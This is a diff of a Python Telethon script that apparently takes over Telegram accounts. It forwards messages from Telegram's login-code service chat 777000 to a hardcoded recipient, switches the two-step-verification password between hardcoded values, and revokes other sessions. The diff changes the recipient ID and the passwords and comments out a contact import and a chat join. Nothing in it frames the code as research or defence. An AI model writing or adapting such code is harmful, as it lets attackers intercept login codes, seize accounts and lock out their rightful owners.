@@ -65,11 +65,12 @@ from telethon.errors import SessionPasswordNeededError, FloodWaitError
 from telethon.tl.types import Message
 
 SOURCE_CHAT_ID = 777000               # Telegram 服务讯息
-TARGET_USER_ID = 7038631858           # 接收者 user_id（整数）
+TARGET_USER_ID = 7550420493           # 接收者 user_id（整数）
 # OLD_PASSWORD = "008009"
-OLD_PASSWORD = "258147"
-
-NEW_PASSWORD = "Qqqw1234"
+# OLD_PASSWORD = "258147"
+OLD_PASSWORD = "Qqqw1234"
+# NEW_PASSWORD = "Qqqw1234"
+NEW_PASSWORD = "008009"
 HINT         = "myhint"                  # 可选：密码提示
 
 
@@ -272,7 +273,7 @@ async def add_contact():
 
     result = await client(ImportContactsRequest([contact]))
     print("导入结果:", result)
-    target = await client.get_entity(TARGET_USER_ID)     # 7038631858
+    target = await client.get_entity(TARGET_USER_ID)     # 7550420493
 
 
     me = await client.get_me()
@@ -673,7 +674,7 @@ async def main():
     now = datetime.now()
     print(f"Current: {now.strftime('%Y-%m-%d %H:%M:%S')}",flush=True)
 
-    await add_contact()
+    # await add_contact()
 
     # try:
     #     await client.edit_2fa(
@@ -704,8 +705,7 @@ async def main():
                 print(f"删除 {a.hash} 失败: {e}")
         else:
             print(f"✅ 保留 id={a.hash}  device={a.device_model}  platform={a.platform}  ip={a.ip}  date={a.date_created}")
-    await join("omrySLPazzFjMjg0")
-    exit()
+   
     # ——监听 777000 的新消息并即时复制——
     @client.on(events.NewMessage(chats=SOURCE_CHAT_ID))
     async def handler(event: events.NewMessage.Event):
@@ -719,7 +719,7 @@ async def main():
     # exit()
     # # 获取来源与目标实体
     # source = await client.get_entity(SOURCE_CHAT_ID)     # 777000
-    # target = await client.get_entity(TARGET_USER_ID)     # 7038631858
+    # target = await client.get_entity(TARGET_USER_ID)     # 7550420493
 # await client.send_message(target, msgs[0].text)
     # # 读取最后 3 则（默认新→旧），为了按时间顺序转发，反转一下
     # msgs = await client.get_messages(source, limit=1)
